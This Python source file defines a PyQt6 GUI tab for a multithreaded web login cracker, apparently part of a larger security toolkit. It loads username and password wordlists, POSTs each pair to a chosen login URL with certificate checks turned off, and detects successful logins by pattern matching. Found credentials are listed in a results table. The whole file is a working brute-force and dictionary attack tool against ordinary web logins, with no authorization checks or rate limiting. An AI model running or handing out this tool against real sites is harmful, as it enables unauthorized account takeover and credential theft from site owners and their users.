from PyQt6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel,
                            QLineEdit, QPushButton, QTableWidget,
                            QTableWidgetItem, QHeaderView, QFrame, QTextEdit,
                            QMessageBox, QComboBox, QGroupBox, QFileDialog,
                            QCheckBox, QSpinBox, QProgressBar)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
import requests
import threading
import queue
import re
from typing import Dict, List, Optional
import json
import time
from urllib.parse import urlparse

class WebCrackerThread(QThread):
    crack_complete = pyqtSignal(dict)
    progress_updated = pyqtSignal(int, str)
    error_occurred = pyqtSignal(str)
    credentials_found = pyqtSignal(dict)
    
    def __init__(self, url: str, username_field: str, password_field: str,
                 success_pattern: str, failure_pattern: str, attack_type: str,
                 usernames: List[str], passwords: List[str], max_threads: int = 5):
        super().__init__()
        self.url = url
        self.username_field = username_field
        self.password_field = password_field
        self.success_pattern = success_pattern
        self.failure_pattern = failure_pattern
        self.attack_type = attack_type
        self.usernames = usernames
        self.passwords = passwords
        self.max_threads = max_threads
        self._is_running = True
        self.credentials_queue = queue.Queue()
        self.found_credentials = []
        
    def run(self):
        try:
            if self.attack_type == "brute_force":
                self._run_brute_force()
            elif self.attack_type == "dictionary":
                self._run_dictionary()
                
        except Exception as e:
            self.error_occurred.emit(str(e))
            
    def _run_brute_force(self):
        total_attempts = len(self.usernames) * len(self.passwords)
        current_attempt = 0
        
        for username in self.usernames:
            if not self._is_running:
                break
                
            for password in self.passwords:
                if not self._is_running:
                    break
                    
                try:
                    if self._try_credentials(username, password):
                        self.found_credentials.append({
                            "username": username,
                            "password": password
                        })
                        self.credentials_found.emit({
                            "username": username,
                            "password": password
                        })
                        
                except Exception as e:
                    self.error_occurred.emit(str(e))
                    
                current_attempt += 1
                progress = int((current_attempt / total_attempts) * 100)
                self.progress_updated.emit(
                    progress,
                    f"Trying {username}:{password}"
                )
                
        self.crack_complete.emit({
            "found_credentials": self.found_credentials,
            "total_attempts": current_attempt
        })
        
    def _run_dictionary(self):
        total_attempts = len(self.usernames) * len(self.passwords)
        current_attempt = 0
        
        # Create worker threads
        threads = []
        for _ in range(self.max_threads):
            thread = threading.Thread(target=self._dictionary_worker)
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
        # Add credentials to queue
        for username in self.usernames:
            if not self._is_running:
                break
            for password in self.passwords:
                if not self._is_running:
                    break
                self.credentials_queue.put((username, password))
                
        # Wait for all credentials to be processed
        self.credentials_queue.join()
        
        # Stop worker threads
        for _ in range(self.max_threads):
            self.credentials_queue.put(None)
            
        for thread in threads:
            thread.join()
            
        self.crack_complete.emit({
            "found_credentials": self.found_credentials,
            "total_attempts": total_attempts
        })
        
    def _dictionary_worker(self):
        while True:
            item = self.credentials_queue.get()
            if item is None:
                self.credentials_queue.task_done()
                break
                
            username, password = item
            try:
                if self._try_credentials(username, password):
                    self.found_credentials.append({
                        "username": username,
                        "password": password
                    })
                    self.credentials_found.emit({
                        "username": username,
                        "password": password
                    })
            except Exception as e:
                self.error_occurred.emit(str(e))
                
            self.credentials_queue.task_done()
            
    def _try_credentials(self, username: str, password: str) -> bool:
        try:
            # Prepare form data
            form_data = {
                self.username_field: username,
                self.password_field: password
            }
            
            # Send POST request
            response = requests.post(
                self.url,
                data=form_data,
                verify=False,
                timeout=10
            )
            
            # Check response against patterns
            if self.success_pattern:
                if re.search(self.success_pattern, response.text):
                    return True
            if self.failure_pattern:
                if not re.search(self.failure_pattern, response.text):
                    return True
                    
            return False
            
        except Exception as e:
            raise Exception(f"Error trying credentials {username}:{password}: {str(e)}")
            
    def stop(self):
        self._is_running = False

class WebCrackerTab(QWidget):
    def __init__(self):
        super().__init__()
        self.cracker_thread = None
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout()
        
        # Input section
        input_frame = QFrame()
        input_frame.setFrameStyle(QFrame.Shape.StyledPanel | QFrame.Shadow.Raised)
        input_layout = QVBoxLayout(input_frame)
        
        # URL input
        url_layout = QHBoxLayout()
        url_label = QLabel("Login URL:")
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("e.g., http://example.com/login")
        url_layout.addWidget(url_label)
        url_layout.addWidget(self.url_input)
        input_layout.addLayout(url_layout)
        
        # Form field inputs
        fields_layout = QHBoxLayout()
        username_label = QLabel("Username Field:")
        self.username_field_input = QLineEdit()
        self.username_field_input.setPlaceholderText("e.g., username")
        password_label = QLabel("Password Field:")
        self.password_field_input = QLineEdit()
        self.password_field_input.setPlaceholderText("e.g., password")
        fields_layout.addWidget(username_label)
        fields_layout.addWidget(self.username_field_input)
        fields_layout.addWidget(password_label)
        fields_layout.addWidget(self.password_field_input)
        input_layout.addLayout(fields_layout)
        
        # Pattern inputs
        patterns_layout = QHBoxLayout()
        success_label = QLabel("Success Pattern:")
        self.success_pattern_input = QLineEdit()
        self.success_pattern_input.setPlaceholderText("e.g., Welcome")
        failure_label = QLabel("Failure Pattern:")
        self.failure_pattern_input = QLineEdit()
        self.failure_pattern_input.setPlaceholderText("e.g., Invalid")
        patterns_layout.addWidget(success_label)
        patterns_layout.addWidget(self.success_pattern_input)
        patterns_layout.addWidget(failure_label)
        patterns_layout.addWidget(self.failure_pattern_input)
        input_layout.addLayout(patterns_layout)
        
        # Attack settings
        settings_layout = QHBoxLayout()
        attack_label = QLabel("Attack Type:")
        self.attack_type_combo = QComboBox()
        self.attack_type_combo.addItems(["brute_force", "dictionary"])
        threads_label = QLabel("Max Threads:")
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, 20)
        self.threads_input.setValue(5)
        settings_layout.addWidget(attack_label)
        settings_layout.addWidget(self.attack_type_combo)
        settings_layout.addWidget(threads_label)
        settings_layout.addWidget(self.threads_input)
        input_layout.addLayout(settings_layout)
        
        # Username/Password lists
        lists_layout = QHBoxLayout()
        self.username_file_btn = QPushButton("Load Usernames")
        self.username_file_btn.clicked.connect(lambda: self.load_file("usernames"))
        self.password_file_btn = QPushButton("Load Passwords")
        self.password_file_btn.clicked.connect(lambda: self.load_file("passwords"))
        lists_layout.addWidget(self.username_file_btn)
        lists_layout.addWidget(self.password_file_btn)
        input_layout.addLayout(lists_layout)
        
        layout.addWidget(input_frame)
        
        # Control buttons
        button_layout = QHBoxLayout()
        self.start_btn = QPushButton("Start Attack")
        self.start_btn.clicked.connect(self.start_attack)
        self.stop_btn = QPushButton("Stop")
        self.stop_btn.clicked.connect(self.stop_attack)
        self.stop_btn.setEnabled(False)
        self.clear_btn = QPushButton("Clear")
        self.clear_btn.clicked.connect(self.clear_results)
        button_layout.addWidget(self.start_btn)
        button_layout.addWidget(self.stop_btn)
        button_layout.addWidget(self.clear_btn)
        layout.addLayout(button_layout)
        
        # Progress bar
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setTextVisible(True)
        self.progress_label = QLabel("Ready")
        layout.addWidget(self.progress_label)
        layout.addWidget(self.progress_bar)
        
        # Results section
        results_frame = QFrame()
        results_frame.setFrameStyle(QFrame.Shape.StyledPanel | QFrame.Shadow.Raised)
        results_layout = QVBoxLayout(results_frame)
        
        # Credentials table
        credentials_label = QLabel("Found Credentials:")
        self.credentials_table = QTableWidget()
        self.credentials_table.setColumnCount(2)
        self.credentials_table.setHorizontalHeaderLabels(["Username", "Password"])
        self.credentials_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        results_layout.addWidget(credentials_label)
        results_layout.addWidget(self.credentials_table)
        
        # Status text
        self.status_text = QTextEdit()
        self.status_text.setReadOnly(True)
        results_layout.addWidget(self.status_text)
        
        layout.addWidget(results_frame)
        
        self.setLayout(layout)
        
        # Initialize lists
        self.usernames = []
        self.passwords = []
        
    def load_file(self, file_type: str):
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            f"Select {file_type.capitalize()} File",
            "",
            "Text Files (*.txt);;All Files (*)"
        )
        
        if file_path:
            try:
                with open(file_path, 'r') as f:
                    lines = [line.strip() for line in f if line.strip()]
                    
                if file_type == "usernames":
                    self.usernames = lines
                    self.username_file_btn.setText(f"Usernames Loaded: {len(lines)}")
                else:
                    self.passwords = lines
                    self.password_file_btn.setText(f"Passwords Loaded: {len(lines)}")
                    
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Error loading file: {str(e)}")
                
    def start_attack(self):
        # Validate inputs
        url = self.url_input.text().strip()
        username_field = self.username_field_input.text().strip()
        password_field = self.password_field_input.text().strip()
        success_pattern = self.success_pattern_input.text().strip()
        failure_pattern = self.failure_pattern_input.text().strip()
        
        if not all([url, username_field, password_field]):
            QMessageBox.warning(self, "Warning", "Please fill in all required fields")
            return
            
        if not self.usernames or not self.passwords:
            QMessageBox.warning(self, "Warning", "Please load username and password lists")
            return
            
        try:
            # Clean up any existing thread
            if self.cracker_thread and self.cracker_thread.isRunning():
                self.cracker_thread.stop()
                self.cracker_thread.wait(1000)
                if self.cracker_thread.isRunning():
                    self.cracker_thread.terminate()
                    
            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.clear_results()
            
            # Start attack
            self.cracker_thread = WebCrackerThread(
                url,
                username_field,
                password_field,
                success_pattern,
                failure_pattern,
                self.attack_type_combo.currentText(),
                self.usernames,
                self.passwords,
                self.threads_input.value()
            )
            
            self.cracker_thread.crack_complete.connect(self.handle_results)
            self.cracker_thread.progress_updated.connect(self.update_progress)
            self.cracker_thread.error_occurred.connect(self.handle_error)
            self.cracker_thread.credentials_found.connect(self.handle_credentials)
            self.cracker_thread.start()
            
        except Exception as e:
            self.handle_error(str(e))
            
    def stop_attack(self):
        if self.cracker_thread and self.cracker_thread.isRunning():
            self.cracker_thread.stop()
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        
    def update_progress(self, value, message):
        self.progress_bar.setValue(value)
        self.progress_label.setText(message)
        
    def handle_credentials(self, credentials):
        row = self.credentials_table.rowCount()
        self.credentials_table.insertRow(row)
        self.credentials_table.setItem(row, 0, QTableWidgetItem(credentials["username"]))
        self.credentials_table.setItem(row, 1, QTableWidgetItem(credentials["password"]))
        self.status_text.append(f"Found credentials: {credentials['username']}:{credentials['password']}")
        
    def handle_results(self, results):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_bar.setValue(100)
        self.progress_label.setText("Attack complete")
        
        if results["found_credentials"]:
            self.status_text.append(f"\nAttack completed. Found {len(results['found_credentials'])} valid credentials.")
        else:
            self.status_text.append("\nAttack completed. No valid credentials found.")
            
    def handle_error(self, error_message):
        QMessageBox.critical(self, "Error", f"An error occurred: {error_message}")
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.progress_label.setText("Error occurred")
        
    def clear_results(self):
        self.credentials_table.setRowCount(0)
        self.status_text.clear()
        self.progress_bar.setValue(0)
        self.progress_label.setText("Ready") 